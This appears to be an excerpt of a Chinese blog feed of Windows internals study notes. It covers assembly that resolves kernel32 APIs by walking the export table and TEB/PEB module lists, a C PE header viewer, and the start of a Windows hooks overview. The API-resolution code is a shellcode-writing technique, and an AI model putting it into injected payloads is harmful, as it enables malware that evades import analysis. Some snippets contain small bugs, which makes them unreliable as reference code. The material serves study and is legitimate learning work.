mov esi, szApiname</span><br><span class="line">		mov edx, esi</span><br><span class="line">countStr:</span><br><span class="line">		cmp byte ptr [esi], <span class="number">0</span> ;字符串末尾是否为<span class="number">0</span></span><br><span class="line">		jz countStrOver</span><br><span class="line">		inc esi;还没结束继续</span><br><span class="line">		jmp countStr</span><br><span class="line"></span><br><span class="line">countStrOver:</span><br><span class="line">		inc esi</span><br><span class="line">		sub esi, edx ;减去首地址得到长度</span><br><span class="line">		mov apilen, esi</span><br><span class="line"></span><br><span class="line">		;找到导出表地址</span><br><span class="line">		mov esi, hModule;拿到模块基地址		一般esi存放指针、地址</span><br><span class="line">		add esi, [esi+<span class="number">3</span>ch];	+<span class="number">3</span>ch定位到NT_HEADERS</span><br><span class="line">		assume esi:ptr IMAGE_NT_HEADERS ;</span><br><span class="line">		</span><br><span class="line">		mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress;得到导出表RVA</span><br><span class="line">		add esi, hModule;加上基地址 定位到地址</span><br><span class="line"></span><br><span class="line">		assume esi:ptr IMAGE_EXPORT_DIRECTORY; 让esi 指向 Kernel32.dll 的导出表</span><br><span class="line"></span><br><span class="line">		mov ebx, [esi].AddressOfNames; </span><br><span class="line">		add ebx, hModule</span><br><span class="line"></span><br><span class="line">		xor edx, edx ;计数函数 先初始化</span><br><span class="line">		.repeat</span><br><span class="line">			push esi</span><br><span class="line">			mov edi, [ebx]</span><br><span class="line">			add edi, hModule; 指向AddressOfNames指向的数组</span><br><span class="line">			mov esi, szApiname</span><br><span class="line">			mov ecx, apilen</span><br><span class="line">			cld  ;设置方向标志 正向</span><br><span class="line">			repz cmpsb ;开始遍历查找      rep(重复)z(相等) ds:esi和es:edi 所指向的两个字节相等(zf=<span class="number">1</span>) 就继续比较  如果不相等就停止循环</span><br><span class="line"></span><br><span class="line">			.<span class="keyword">if</span> ZERO? ; 找到了    ZERO?是否置位 相当于 <span class="keyword">if</span>(zf==<span class="number">1</span>)</span><br><span class="line">				pop esi ; 恢复esi  esi指向导出表</span><br><span class="line">				jmp findOver</span><br><span class="line">			.endif</span><br><span class="line">			;如果没找到</span><br><span class="line">			pop esi ; 恢复esi  esi指向导出表</span><br><span class="line">			add ebx,<span class="number">4</span> ;下一个函数名称 每个函数地址占<span class="number">4</span>个字节</span><br><span class="line">			inc edx; 计数函数加<span class="number">1</span></span><br><span class="line"></span><br><span class="line">		.until edx &gt;= [esi].NumberOfNames ;遍历完后没有找到 退出   NumberOfNames函数名称总数量</span><br><span class="line">		jmp _Exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">findOver:</span><br><span class="line">		sub ebx, hModule; 减去基地址 得到RVA</span><br><span class="line">		sub ebx, [esi].AddressOfNames;得到匹配函数字符串首地址 相当于数组起始地址的偏移量</span><br><span class="line"></span><br><span class="line">		;除以<span class="number">2</span>，用这个偏移量+AddressOfNameOrdinals指向的数组首地址找到索引</span><br><span class="line">		shr ebx,<span class="number">1</span> </span><br><span class="line">		add ebx,[esi].AddressOfNameOrdinals;加上算出来的偏移量找到和AddressOfNames对应的那一项</span><br><span class="line">		add ebx,hModule</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		movzx eax,word ptr [ebx];取出AddressOfNameOrdinals那一项存放的索引  word movzx高位拓展<span class="number">0</span></span><br><span class="line">		shl eax,<span class="number">2</span>;乘以<span class="number">4</span>   索引值x4个字节+</span><br><span class="line">		add eax,[esi].AddressOfFunctions;AddressOfFunctions指向函数RVA地址表起始地址，加上这个偏移量取出AddressOfNameOrdinals给出索引的那一项</span><br><span class="line">		add eax,hModule</span><br><span class="line"></span><br><span class="line">		;API<span class="number">&#x27;</span>s Address = ( API<span class="number">&#x27;</span>s Ordinal * <span class="number">4</span> ) + AddressOfFunctions<span class="number">&#x27;</span> VA + Kernel32 imagebase</span><br><span class="line"></span><br><span class="line">		mov eax,[eax];得到函数的RVA</span><br><span class="line">		add eax,hModule;加上kernel32基地址得到函数入口地址VA</span><br><span class="line">		mov apibase,eax</span><br><span class="line"></span><br><span class="line">_Exit:</span><br><span class="line">		assume esi:nothing ;不再使用esi寄存器作为指针时  用assume esi:nothing取消定义 释放掉。</span><br><span class="line">		popad</span><br><span class="line">		mov eax, apibase</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">	GetApi endp</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line"></span><br><span class="line">	;得到kernel32基地址</span><br><span class="line">	invoke GetKernelBase, [esp]</span><br><span class="line">	mov lpKernel32, eax</span><br><span class="line">	</span><br><span class="line">	;获取API</span><br><span class="line">	invoke GetApi, lpKernel32, addr szLoadLibraryA</span><br><span class="line">	mov lpLoadLibraryA, eax</span><br><span class="line">	</span><br><span class="line">	invoke GetApi, lpKernel32, addr szGetProcAddress</span><br><span class="line">	mov lpGetProcAddress, eax</span><br><span class="line"></span><br><span class="line">	invoke GetApi,lpKernel32,addr szExitProcess</span><br><span class="line">	mov lpExitProcess,eax</span><br><span class="line"></span><br><span class="line">	;载入user32.dll</span><br><span class="line">	push offset szUser32</span><br><span class="line">	call [lpLoadLibraryA]</span><br><span class="line">	mov lpUser32,eax</span><br><span class="line"></span><br><span class="line">	;获取user32.dll中的MessageBoxA</span><br><span class="line">	push offset szMessageBoxA</span><br><span class="line">	push lpUser32</span><br><span class="line">	call [lpGetProcAddress]</span><br><span class="line">	mov lpMessageBoxA,eax</span><br><span class="line">	</span><br><span class="line">	push MB_OK </span><br><span class="line">	push  offset hola</span><br><span class="line">	push  offset hola</span><br><span class="line">	push <span class="literal">NULL</span></span><br><span class="line">	call [lpMessageBoxA]</span><br><span class="line"></span><br><span class="line">	push <span class="number">0</span></span><br><span class="line">	call [lpExitProcess]</span><br><span class="line"></span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>在VS2022下编译有问题 然后又换到了vs2017 成功通过找api地址的方式去调用MessageBoxA函数</p>
<p><img src="/posts/9aa42a48/13-1.png"></p>
<h5 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h5><p>待完善补充…</p>
<h5 id="TEB搜索"><a href="#TEB搜索" class="headerlink" title="TEB搜索"></a>TEB搜索</h5><p>此方法是通过TEB获得PEB结构地址，然后再获得PEB_LDR_DATA结构地址，然后遍历模块列表，查找kernel32.dll模块的基地址。</p>
<p>fs寄存器指向TEB结构，<code>TEB+0X30</code>偏移处指向PEB结构，<code>PEB+0x0c</code>偏移处指向<code>PEB_LDR_DATA</code>结构，<code>PEB_LDR_DATA+0x1c</code>偏移处存放着程序加载的动态链接库地址。 找到的第一个地址为<code>ntdll.dll</code> 第二个为<code>kernel32.dll</code></p>
<p>使用dt _teb 查看teb结构 可以看到在0x30偏移处存储着PEB结构的地址，然后在查看peb结构</p>
<p><img src="/posts/9aa42a48/13-2.png"></p>
<p>peb结构在0x0c地址处存储着 _PEB_LDR_DATA结构地址，然后查看_PEB_LDR_DATA结构</p>
<p><img src="/posts/9aa42a48/13-3.png" alt="img"></p>
<p>通过 _PEB_LDR_DATA 拿到保存模块信息结构体的链表 _LIST_ENTRT </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lkd&gt; dt _PEB_LDR_DATA</span><br><span class="line">nt!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Initialized      : UChar</span><br><span class="line">   +<span class="number">0x008</span> SsHandle         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x024</span> EntryInProgress  : Ptr32 Void</span><br><span class="line">   ....</span><br></pre></td></tr></table></figure>

<p><code>_LIST_ENTRY</code>有三种不同方式排列的双向链表</p>
<p><img src="/posts/9aa42a48/13-4.png" alt="img"></p>
<p><code>Flink</code>表示从前往后， <code>Blink</code>表示从后往前</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	DWORD kernel32str = <span class="number">0</span>;</span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax, fs: [<span class="number">30</span>h]				<span class="comment">//拿到peb</span></span><br><span class="line">		mov eax, dword ptr [eax + <span class="number">0</span>ch]	<span class="comment">//拿到_PEB_LDR_DATA</span></span><br><span class="line">		mov eax, dword ptr [eax + <span class="number">0</span>ch]	<span class="comment">//获取InLoadOrderModuleList地址</span></span><br><span class="line"></span><br><span class="line">		mov eax, [eax]</span><br><span class="line">		mov eax, [eax]</span><br><span class="line"></span><br><span class="line">		mov ebx, dword ptr [eax + <span class="number">18</span>h]</span><br><span class="line">		mov kernel32str, ebx</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%0x&quot;</span>, kernel32str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD kernel32str = <span class="number">0</span>;</span><br><span class="line">	_asm &#123;</span><br><span class="line"></span><br><span class="line">		mov eax, fs:[<span class="number">30</span>h]				<span class="comment">//peb</span></span><br><span class="line">		mov eax, dword ptr [eax + <span class="number">0</span>ch]	<span class="comment">//</span></span><br><span class="line">		mov esi, dword ptr [eax + <span class="number">1</span>ch]	<span class="comment">//InInitializationOrderLinks</span></span><br><span class="line">        <span class="comment">//Get InInitializationOrderModuleList.Flink, </span></span><br><span class="line">        <span class="comment">//此时eax指向的是ntdll模块的InInitializationOrderModuleList线性地址。</span></span><br><span class="line">        <span class="comment">//所以我们获得它的下一个则是kernel32.dll</span></span><br><span class="line">            </span><br><span class="line">		lodsd <span class="comment">//可以优化</span></span><br><span class="line">		mov eax, dword ptr [eax + <span class="number">8</span>h]	<span class="comment">//</span></span><br><span class="line">		mov kernel32str, ebx</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, kernel32str);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/9aa42a48/13-5.png" alt="img"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.cnblogs.com/witty/archive/2012/03/23/2413890.html">https://www.cnblogs.com/witty/archive/2012/03/23/2413890.html</a></p>
<p><a href="https://blog.csdn.net/qq_35426012/article/details/102711275">https://blog.csdn.net/qq_35426012/article/details/102711275</a></p>
<p><a href="https://blog.csdn.net/whypp/article/details/5681172">https://blog.csdn.net/whypp/article/details/5681172</a></p>
<p><a href="https://blog.csdn.net/b_h_l/article/details/30506955">https://blog.csdn.net/b_h_l/article/details/30506955</a></p>
<p>[<a href="https://juejin.cn/post/7102343426070298660#heading-3">笔记]Windows安全之《三》注入技术之 Shellcode注入 - 掘金</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-12_PE结构</title>
    <url>/posts/896a905d/</url>
    <content><![CDATA[<p>前面在github上写过这个pe基础 在看下这个复习下 <a href="https://mamor5409.github.io/posts/d8527941/">https://mamor5409.github.io/posts/d8527941/</a></p>
<p>看了下滴水三期的PE 并参考一位师傅的滴水笔记 <a href="https://github.com/gh0stkey/Binary-Learning">https://github.com/gh0stkey/Binary-Learning</a></p>
<h4 id="RVA-2-FOA"><a href="#RVA-2-FOA" class="headerlink" title="RVA_2_FOA"></a>RVA_2_FOA</h4><p><img src="/posts/896a905d/12-1.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">RVAToFOA</span><span class="params">(HANDLE imageBase, DWORD dwRVA)</span></span><br><span class="line">&#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHead = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSection = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD NumberOfSectinsCount = <span class="number">0</span>;</span><br><span class="line">	DWORD dwImageBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	pNtHead = GetNtHeader(imageBase);</span><br><span class="line">	pSection = IMAGE_FIRST_SECTION(pNtHead);</span><br><span class="line"></span><br><span class="line">	dwImageBase = pNtHead-&gt;OptionalHeader.ImageBase;</span><br><span class="line">	NumberOfSectinsCount = pNtHead-&gt;FileHeader.NumberOfSections;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> each = <span class="number">0</span>; each &lt; NumberOfSectinsCount; each++)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD Section_Start = pSection[each].VirtualAddress;                                  <span class="comment">// 计算RVA开始位置</span></span><br><span class="line">		DWORD Section_Ends = pSection[each].VirtualAddress + pSection[each].Misc.VirtualSize; <span class="comment">// 计算RVA结束位置</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwRVA &gt;= Section_Start &amp;&amp; dwRVA &lt;= Section_Ends)</span><br><span class="line">		&#123;</span><br><span class="line">			DWORD VA = pNtHead-&gt;OptionalHeader.ImageBase + dwRVA;                                  <span class="comment">// 得到VA地址</span></span><br><span class="line">			DWORD FOA = pSection[each].PointerToRawData + (dwRVA - pSection[each].VirtualAddress); <span class="comment">// 得到FOA</span></span><br><span class="line">			<span class="keyword">return</span> FOA;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="简单实现PEview"><a href="#简单实现PEview" class="headerlink" title="简单实现PEview"></a>简单实现PEview</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;DbgHelp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HANDLE <span class="title function_">OpenPe</span><span class="params">(<span class="type">char</span>* filename)</span> &#123;</span><br><span class="line"></span><br><span class="line">	HANDLE hfile = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hMapfile = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE 起始基地址 = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD size = <span class="number">0</span>;</span><br><span class="line">	hfile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	size = GetFileSize(hfile, <span class="literal">NULL</span>);</span><br><span class="line">	hMapfile = CreateFileMapping(hfile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, size, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	起始基地址 = MapViewOfFile(hMapfile, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, size);</span><br><span class="line">	<span class="keyword">if</span>(起始基地址 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> 起始基地址;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;未能成功打开！\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showDosHeadInfo</span><span class="params">(HANDLE imageBase)</span> &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER DosHaeder = imageBase;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;DOS头:%x \n&quot;</span>, DosHaeder-&gt;e_magic);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;PE偏移:%x \n&quot;</span>, DosHaeder-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">isPE</span><span class="params">(HANDLE imageBase)</span> &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);			<span class="comment">//e_lfanew偏移</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pNthead-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS <span class="title function_">GetNTHead</span><span class="params">(HANDLE imageBase)</span> &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);			<span class="comment">//e_lfanew偏移</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pNthead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 读取PE文件头(HANDLE imageBase) &#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = GetNTHead(imageBase);</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = &amp;pNthead-&gt;FileHeader;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;运行平台: %x\n&quot;</span>, pFileHeader-&gt;Machine);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;节区数目: %x\n&quot;</span>, pFileHeader-&gt;NumberOfSections);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建日期: %lu\n&quot;</span>, pFileHeader-&gt;TimeDateStamp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;可选头大小: %x\n&quot;</span>, pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;文件属性: %0x\n&quot;</span>, pFileHeader-&gt;Machine);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;运行平台: 0x%08x\n&quot;</span>, pFileHeader-&gt;Characteristics);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 读取PE可选头(HANDLE imageBase) &#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = GetNTHead(imageBase);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionalHeader = &amp;pNthead-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;入口点: %x\n&quot;</span>, pOptionalHeader-&gt;AddressOfEntryPoint);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;基地址: %x\n&quot;</span>, pOptionalHeader-&gt;ImageBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 读取节表(HANDLE imageBase)&#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = GetNTHead(imageBase);</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = &amp;pNthead-&gt;FileHeader;</span><br><span class="line">	DWORD NumberOfSectionsCount = pFileHeader-&gt;NumberOfSections;	<span class="comment">//节表数量</span></span><br><span class="line"></span><br><span class="line">	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNthead);		<span class="comment">//IMAGE_FIRST_SECTION 找到第一个节</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;节区名称\tRVA_偏移\t节区大小\tRaw_尺寸\tRaw_偏移\t节区属性\t\n &quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; NumberOfSectionsCount; i++, section++)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>, section-&gt;Name);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t&quot;</span>, section-&gt;VirtualAddress);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t&quot;</span>, section-&gt;Misc.VirtualSize);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t&quot;</span>, section-&gt;SizeOfRawData);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t&quot;</span>, section-&gt;PointerToRawData);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t\n&quot;</span>, section-&gt;Characteristics);</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 读取导入表(HANDLE imageBase) &#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = GetNTHead(imageBase);</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR dll描述符 = ImageRvaToVa(pNthead, imageBase, pNthead-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress, <span class="literal">NULL</span>);	<span class="comment">//存放各种dll</span></span><br><span class="line">	</span><br><span class="line">	PIMAGE_THUNK_DATA stthunk = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwthunk = <span class="literal">NULL</span>;</span><br><span class="line">	USHORT Hint;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;导入表为:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;函数地址\t模块名称\t函数名称\t\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (dll描述符-&gt;Name != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span>* 模块名称 = ImageRvaToVa(pNthead, imageBase, dll描述符-&gt;Name, <span class="literal">NULL</span>);</span><br><span class="line">		stthunk = ImageRvaToVa(pNthead, imageBase, dll描述符-&gt;OriginalFirstThunk, <span class="literal">NULL</span>);</span><br><span class="line">		dwthunk = dll描述符-&gt;OriginalFirstThunk;</span><br><span class="line">		<span class="keyword">while</span> (stthunk-&gt;u1.AddressOfData != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			PIMAGE_IMPORT_BY_NAME funname = stthunk-&gt;u1.AddressOfData;</span><br><span class="line">			<span class="type">char</span>* 函数名称 = ImageRvaToVa(pNthead, imageBase, funname-&gt;Name, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">if</span> (函数名称 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%0.8x\t%s\t%s\n&quot;</span>, dwthunk, 模块名称, 函数名称);		 <span class="comment">//dwthunk 函数地址</span></span><br><span class="line">			&#125;</span><br><span class="line">			dwthunk += <span class="number">4</span>;</span><br><span class="line">			stthunk++;</span><br><span class="line">		&#125;</span><br><span class="line">		dll描述符++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VOID 读取导出表(HANDLE ImageBase)</span><br><span class="line">&#123;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExport;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHead = GetNTHead(ImageBase);</span><br><span class="line"></span><br><span class="line">	pExport = ImageRvaToVa(pNtHead, ImageBase, pNtHead-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (pExport == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;导出表为空\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD NumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line">	DWORD** ppdwNames = pExport-&gt;AddressOfNames;	</span><br><span class="line"></span><br><span class="line">	ppdwNames = ImageRvaToVa(pNtHead, ImageBase, ppdwNames, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	DWORD** ppdwAddr = pExport-&gt;AddressOfFunctions;</span><br><span class="line"></span><br><span class="line">	ppdwAddr = ImageRvaToVa(pNtHead, ImageBase, ppdwAddr, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* szFunction = ImageRvaToVa(pNtHead, ImageBase, *ppdwNames, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;导出表为:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;RVA_地址\t函数名称\t\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; NumberOfNames; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%0.8x\t%s\n&quot;</span>, *ppdwAddr, szFunction);		<span class="comment">// RVA 函数名称</span></span><br><span class="line">		szFunction = szFunction + <span class="built_in">strlen</span>(szFunction) + <span class="number">1</span>;</span><br><span class="line">		ppdwAddr++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	HANDLE 基地址 = <span class="literal">NULL</span>;</span><br><span class="line">	基地址 = OpenPe(<span class="string">&quot;C:\\Users\\test\\Desktop\\menuedit.dll&quot;</span>);</span><br><span class="line">	<span class="comment">//基地址 = OpenPe(&quot;C:\\Users\\test\\Desktop\\32injectdll.dll&quot;);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//showDosHeadInfo(基地址);</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (isPE(基地址) == TRUE) &#123;</span><br><span class="line">		读取PE文件头(基地址);</span><br><span class="line">		读取PE可选头(基地址);</span><br><span class="line">		读取节表(基地址);</span><br><span class="line">		读取导入表(基地址);</span><br><span class="line">		读取导出表(基地址);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不是PE结构\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-11_WindowsHook</title>
    <url>/posts/71edaaad/</url>
    <content><![CDATA[<p><strong>Windows HooK钩子技术是指基于Windows中窗口的程序的消息处理机制，对系统或者进程中的消息进行截获和处理，并将截获和处理的消息在重新处理和发送，使其可以实现不同的功能。</strong></p>
<p>钩子技术分为<strong>系统钩子</strong>技术和<strong>线程钩子</strong>技术</p>
<p><strong>系统钩子</strong>：是用于监视系统中的消息的钩子技术，因为系统钩子会影响系统中所有的应用程序，所以钩子函数必须放在独立的动态链接库(DLL) 中。做好之后使用其他程序将钩子挂载到系统的进程中。</p>
<p><strong>线程钩子</strong>：指的是对指定线程进行监视。</p>
<p><strong>钩子原理</strong></p>
<p>在使用钩子技术的时候，WINDOWS会先在内存中创建一个数据结构，该数据结构包含了钩子的相关信息，然后把该结构体加到已经存在的钩子链表中去。新的钩子将加到老的前面。</p>
<p>当系统触发产生一个消息时，如果安装的是一个线程钩子，进程中的钩子函数将被调用。</p>
<p>如果是一个系统钩子，系统就必须把钩子函数插入到其它进程的地址空间，要做到这一点要求钩子函数必须在一个动态链接库中，所以如果想要使用系统钩子，就必须把该钩子函数放到动态链接库中去。</p>
<h4 id="Hook-函数及类型"><a href="#Hook-函数及类型" class="headerlink" title="Hook 函数及类型"></a>Hook 函数及类型</h4><h5 id="钩子类型"><a href="#钩子类型" class="headerlink" title="钩子类型"></a>钩子类型</h5><table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>WH_MSGFILTER</td>
<td>截获用户与控件交互的消息</td>
</tr>
<tr>
<td>WH_KEYBOARD</td>
<td>截获键盘消息</td>
</tr>
<tr>
<td>WH_GETMESSAGE</td>
<td>截获从消息队列送出的消息</td>
</tr>
<tr>
<td>WH_CBT</td>
<td>截获系统基本消息，激活，建立，销毁，最小化，最大化，移动，改变尺寸等窗口事件</td>
</tr>
<tr>
<td>WH_MOUSE</td>
<td>截获鼠标消息</td>
</tr>
<tr>
<td>WH_CALLWNDPROCRET</td>
